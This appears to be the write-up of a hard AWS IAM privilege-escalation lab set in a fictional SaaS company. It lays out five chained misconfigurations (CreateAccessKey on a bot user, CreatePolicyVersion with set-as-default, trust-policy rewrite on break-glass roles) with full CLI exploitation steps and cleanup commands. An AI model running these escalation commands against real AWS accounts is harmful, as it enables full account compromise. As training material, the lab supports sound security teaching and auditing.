# Lab 11 — Enterprise Realistic (Hard)

## Scenario

"Acme Cloud, Inc." is a 100-employee SaaS company spanning 19 departments — marketing, sales, customer success, three engineering teams, data engineering, data ops, ML, SRE, DevOps, security, IT operations, finance, HR, legal, and the executive office. The IAM environment was built incrementally over five years by different teams. Every individual grant has a plausible business rationale; the security team has performed multiple audits and signed off on each.

Nevertheless, a privilege escalation path winds across **five distinct IAM-policy primitives**, climbs through one machine identity, and terminates at a break-glass administrator role — all starting from a single marketing analyst's credentials. The chain is **purely IAM-based**: no Lambda environment variables, no Secrets Manager values, no SSM SendCommand, no Glue script swaps, no S3 file contents, no EC2 runtime data are involved. Every escalation step is authorised by an IAM policy evaluation.

The entry principal cannot list policies outside their team tag, cannot assume any role, cannot read any secret, cannot enumerate the bulk of the environment. **Every hop unlocks broader discovery** as well as broader capability: by the time the attacker reaches the Glue data-ops role, they can rewrite trust policies of every break-glass role in the account.

## Environment

| Category | Count | Notes |
|----------|-------|-------|
| IAM Users | 100 + 1 machine identity + 1 chain entry + 1 admin = 103 total | Distributed across 19 teams |
| IAM Roles | 27 | Chain roles, service roles, deployment roles, break-glass, and noise |
| IAM Groups | 15 | One per team (or rolled-up "general-readonly" for non-tech) |
| Managed Policies | 1 attacker-relevant (`DataOpsLifecyclePolicy`) + 4 discovery policies | Plus AWS-managed (Athena, ReadOnly, etc.) |
| Lambda Functions | 7 | Pure noise — not read by the chain |
| EC2 Instances | 5 | Pure noise |
| S3 Buckets | 4 | Pure noise |

Every Lambda / EC2 / S3 / Glue-like resource that survives in the lab exists only to give the environment realistic shape. **No environment variables, no secret stores, no runtime contents are involved in the escalation.** Every escalation step is a `iam:*` or `sts:*` API call evaluated purely against IAM policy.

### Team / User Distribution

| Team | Users | Sample |
|------|-------|--------|
| marketing-analytics | 11 (incl. chain entry) | `marketing-analyst-01` … `-10`, `marketing-lead`, plus `marketing-analyst-07` |
| marketing-ops | 4 | `marketing-ops-1` … `-4` |
| sales | 8 | `sales-rep-1` … `-8` |
| customer-success | 8 | `cs-agent-1` … `-6`, `cs-lead`, `cs-manager` |
| backend-engineering | 11 | `backend-engineer-01` … `-09`, manager, architect |
| frontend-engineering | 6 | `frontend-engineer-1` … `-5`, lead |
| mobile-engineering | 4 | `mobile-engineer-1` … `-4` |
| data-engineering | 5 | `data-engineer-1` … `-5` |
| data-ops | 3 | `data-ops-1` … `-3` |
| data-analytics | 4 | `data-analyst-1` … `-4` |
| ml-platform | 5 | `ml-engineer-1` … `-5` |
| sre-platform | 6 | `sre-1` … `-5`, `sre-lead` |
| infrastructure (devops) | 5 | `devops-1` … `-4`, `devops-lead` |
| security | 4 | `security-engineer-1` … `-3`, `security-lead` |
| it-operations | 4 | `it-ops-1` … `-4` |
| finance | 5 | analysts, controller, finops, CFO |
| hr | 3 | generalists, director |
| legal | 2 | counsel-1, counsel-2 |
| executive | 3 | CEO, CTO, VP Engineering |
| **machine identity** | 1 | `marketing-data-publisher-bot` |
| **out-of-scope admin** | 1 | `iam-administrator-user` |

## Progressive Visibility

Each principal in the chain is attached to a different discovery policy whose `iam:Get*` and fine-grained `List*` actions are gated on tag conditions:

| Principal | Visibility Tags |
|-----------|----------------|
| `marketing-analyst-07` | `Team=marketing-analytics` |
| `marketing-data-publisher-bot` | `Team=marketing-analytics`, `Team=data-ops` |
| `glue-data-ops-job-role` | `Team=data-ops`, `Team=sre-platform`, `Team=infrastructure`, plus `Role=break-glass` |
| `break-glass-administrator-role` (post-compromise) | `*:*` (admin) |

Coarse top-level `iam:ListUsers / ListRoles / ListGroups / ListPolicies` is permitted so name-level enumeration works at every step; **policy contents** are gated. From the entry user's perspective, only ~12 of 27 roles are introspectable. The break-glass role's trust policy is not visible at all until the attacker has assumed `glue-data-ops-job-role`.

## Vulnerability — Five Independent IAM Misconfigurations

### Misconfiguration 1 — `iam:CreateAccessKey` on a machine user

The chain entry user holds:

```json
{
  "Action": ["iam:CreateAccessKey", "iam:ListAccessKeys",
             "iam:UpdateAccessKey", "iam:DeleteAccessKey"],
  "Resource": "arn:aws:iam::ACCOUNT_ID:user/marketing-data-publisher-bot"
}
```

*Justification*: "marketing analysts are responsible for rotating their team's publisher bot's keys when they expire." Resource scoping locks the permission to one specific user.

The flaw: `iam:CreateAccessKey` produces credentials the *caller* can use directly — there is no MFA challenge, no out-of-band step. Granting this to another principal is functionally equivalent to granting them full impersonation of the target user.

### Misconfiguration 2 — `iam:CreatePolicyVersion` + `--set-as-default` on an attached policy

`marketing-data-publisher-bot` is attached to `DataOpsLifecyclePolicy`, and *the bot itself* holds:

```json
{
  "Action": ["iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
             "iam:DeletePolicyVersion", "iam:GetPolicy",
             "iam:GetPolicyVersion", "iam:ListPolicyVersions"],
  "Resource": "arn:aws:iam::ACCOUNT_ID:policy/DataOpsLifecyclePolicy"
}
```

*Justification*: "data-ops lifecycle automation — the bot rolls forward policy versions during pipeline releases."

The flaw: `iam:CreatePolicyVersion` accepts a `--set-as-default` flag that atomically activates the new version **without requiring `iam:SetDefaultPolicyVersion` as a separate permission**. Because the bot is attached to the policy, writing a new permissive version atomically rewrites the bot's own effective permissions.

### Misconfiguration 3 — `sts:AssumeRole` via the now-permissive policy

After hop 2, the new default version of `DataOpsLifecyclePolicy` grants the bot `sts:AssumeRole` on `glue-data-ops-job-role`. The Glue role's trust policy allows any in-account principal (`"Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" }`) plus the Glue service principal. The IAM permission unlocks the assumption.

### Misconfiguration 4 — `iam:UpdateAssumeRolePolicy` on break-glass roles

`glue-data-ops-job-role` holds:

```json
{
  "Action": ["iam:UpdateAssumeRolePolicy", "iam:GetRole"],
  "Resource": "arn:aws:iam::ACCOUNT_ID:role/break-glass-*"
}
```

*Justification*: "data-ops automation runbook injects the on-call engineer's principal into the break-glass role's trust during pipeline-coordinated incident response."

The flaw: `iam:UpdateAssumeRolePolicy` completely replaces the role's trust policy. There is no condition restricting *what* the new trust can look like — the role can rewrite the trust to permit any principal, including the Glue role itself.

### Misconfiguration 5 — `sts:AssumeRole` after trust rewrite

The same role holds `sts:AssumeRole` on `arn:aws:iam::ACCOUNT_ID:role/break-glass-*`. Combined with the rewritten trust policy of `break-glass-administrator-role` (which now lists the Glue role as an allowed Principal), the assumption succeeds and the attacker obtains `AdministratorAccess`.

## Attack Chain

```
marketing-analyst-07
    │
    │  iam:CreateAccessKey --user-name marketing-data-publisher-bot
    │  → AccessKeyId, SecretAccessKey returned in cleartext
    ▼
marketing-data-publisher-bot  (acting as)
    │
    │  iam:CreatePolicyVersion
    │    --policy-arn DataOpsLifecyclePolicy
    │    --policy-document '{ ...sts:AssumeRole on glue-data-ops-job-role... }'
    │    --set-as-default
    │
    │  Bot's effective permissions are now extended (policy attached to it).
    ▼
marketing-data-publisher-bot  (with new effective perms)
    │
    │  sts:AssumeRole glue-data-ops-job-role
    ▼
glue-data-ops-job-role
    │
    │  iam:UpdateAssumeRolePolicy
    │    --role-name break-glass-administrator-role
    │    --policy-document '{ "Principal": { "AWS": "arn:...:role/glue-data-ops-job-role" } }'
    │
    │  sts:AssumeRole break-glass-administrator-role
    ▼
break-glass-administrator-role
    │
    │  AdministratorAccess attached
    ▼
                FULL ACCOUNT COMPROMISE
```

### Exploitation Steps

1. **Initial reconnaissance.** Configure AWS CLI with `marketing-analyst-07` credentials. Confirm what is visible:
   ```bash
   aws sts get-caller-identity
   aws iam list-users
   aws iam get-user --user-name marketing-data-publisher-bot   # allowed (Team=data-ops? no — bot has Team=data-ops)
   ```
   The analyst sees marketing-analytics-tagged resources. The bot is tagged `Team=data-ops`, but the analyst's policy still allows `iam:CreateAccessKey` on the specific bot ARN.

2. **Hop 1 — forge bot credentials.**
   ```bash
   aws iam create-access-key --user-name marketing-data-publisher-bot
   # → AccessKey { AccessKeyId, SecretAccessKey, Status: Active }
   ```
   Configure a CLI profile (`bot`) with these credentials.

3. **Hop 2 — backdoor the lifecycle policy.**
   ```bash
   cat > new-policy.json <<EOF
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Sid": "BaselineDataOpsRead",
         "Effect": "Allow",
         "Action": ["s3:GetObject", "s3:ListBucket"],
         "Resource": "*"
       },
       {
         "Sid": "PrivescAssume",
         "Effect": "Allow",
         "Action": "sts:AssumeRole",
         "Resource": "arn:aws:iam::ACCOUNT_ID:role/glue-data-ops-job-role"
       }
     ]
   }
   EOF
   aws iam create-policy-version --profile bot \
       --policy-arn arn:aws:iam::ACCOUNT_ID:policy/DataOpsLifecyclePolicy \
       --policy-document file://new-policy.json \
       --set-as-default
   ```

4. **Hop 3 — assume the Glue role.**
   ```bash
   aws sts assume-role --profile bot \
       --role-arn arn:aws:iam::ACCOUNT_ID:role/glue-data-ops-job-role \
       --role-session-name pwn
   ```
   Configure a CLI profile (`gluerole`) with the returned STS credentials. Re-running discovery now reveals `Team=data-ops`, `Team=sre-platform`, `Team=infrastructure`, and `Role=break-glass` tagged resources — including the trust policy of `break-glass-administrator-role`.

5. **Hop 4 — rewrite the break-glass trust policy.**
   ```bash
   cat > trust.json <<EOF
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Effect": "Allow",
       "Principal": {
         "AWS": "arn:aws:iam::ACCOUNT_ID:role/glue-data-ops-job-role"
       },
       "Action": "sts:AssumeRole"
     }]
   }
   EOF
   aws iam update-assume-role-policy --profile gluerole \
       --role-name break-glass-administrator-role \
       --policy-document file://trust.json
   ```

6. **Hop 5 — assume the now-trusting break-glass role.**
   ```bash
   aws sts assume-role --profile gluerole \
       --role-arn arn:aws:iam::ACCOUNT_ID:role/break-glass-administrator-role \
       --role-session-name admin-pwn
   ```
   The returned credentials carry `AdministratorAccess`.

## Why Each Hop Looks Benign

| Hop | Permission | Apparent Justification |
|-----|------------|------------------------|
| 1 | `iam:CreateAccessKey` on one bot user | "Marketing analysts rotate their team's publisher bot's keys when they expire" |
| 2 | `iam:CreatePolicyVersion` on the policy attached to the bot | "Bot rolls forward its own lifecycle policy during pipeline releases" |
| 3 | `sts:AssumeRole` on Glue role (granted by hop 2's new policy version) | Looks like ordinary data-ops automation |
| 4 | `iam:UpdateAssumeRolePolicy` on `break-glass-*` | "Data-ops runbook injects on-call principal during incident response" |
| 5 | `sts:AssumeRole` on the now-trusting break-glass role | Trust policy looks legitimate post-mutation |

Reviewed individually, every grant is defensible — each statement names a single resource or a tight prefix. The vulnerability emerges only when you observe:

- **`iam:CreateAccessKey` on another user is full impersonation.** Resource-scoping limits *which* user can be impersonated, not the strength of the impersonation.
- **`iam:CreatePolicyVersion` with `--set-as-default` skips the supposedly-extra `SetDefaultPolicyVersion` gate.** A principal attached to the policy it can rewrite is rewriting its own permissions.
- **`iam:UpdateAssumeRolePolicy` is unconstrained.** AWS does not provide a built-in condition to restrict the *contents* of the new trust document — only which roles the action applies to.

## Difficulty: Hard

- **Six hops across five distinct IAM-policy primitives** — every one is a well-known escalation primitive in Rhino Security Labs' privilege escalation catalogue, but they are individually rare enough that engineers reviewing one policy at a time miss them.
- **No single policy is sufficient.** The entry user's `iam:CreateAccessKey` produces credentials but no escalation by itself; the bot's `iam:CreatePolicyVersion` rewrites the bot's perms but does not by itself reach admin; only the full chain composes.
- **Progressive tag-scoped discovery** means a static review of any one principal yields no visible escalation path. The break-glass role's trust policy is genuinely invisible to the entry user — they don't even know the role exists until they've assumed the Glue role.
- **100-user environment** ensures the chain participants are statistically unremarkable. `marketing-data-publisher-bot` is one of dozens of machine identities and tagged service users in the org.
- **Trust-policy mutation as the final hop** is one of the cleanest "single permission ⇒ admin" primitives in AWS, and it's gated by a resource prefix that looks defensible (`break-glass-*`).

## Cleanup

```bash
# Reset the break-glass trust policy if you mutated it during exploitation
aws iam update-assume-role-policy \
    --role-name break-glass-administrator-role \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT_ID:root"},"Action":"sts:AssumeRole","Condition":{"StringEquals":{"aws:PrincipalTag/IncidentResponse":"active"}}}]}'

# Delete any extra policy versions you created
aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/DataOpsLifecyclePolicy
aws iam delete-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/DataOpsLifecyclePolicy --version-id v2

# Delete any forged access keys you created for the bot
aws iam list-access-keys --user-name marketing-data-publisher-bot
aws iam delete-access-key --user-name marketing-data-publisher-bot --access-key-id AKIA...

terraform destroy
```
